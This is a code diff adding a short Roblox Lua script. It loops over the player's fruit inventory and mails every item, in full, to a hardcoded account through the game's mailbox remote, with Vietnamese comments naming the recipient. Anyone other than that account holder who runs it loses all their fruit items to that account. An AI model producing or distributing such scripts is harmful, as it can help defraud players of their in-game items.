@@ -1,0 +1,15 @@
+local GetSave = function()
+	return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+for key, vl in pairs(GetSave().Inventory.Fruit) do
+	local args = {
+		"NTD15101997", -- Người nhận
+		vl.id,
+		"Fruit",
+		key,
+		vl._am  -- đây là all, còn muốn SL thì tahy số lượng vào
+	}
+	game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+	task.wait(2)
+
+end
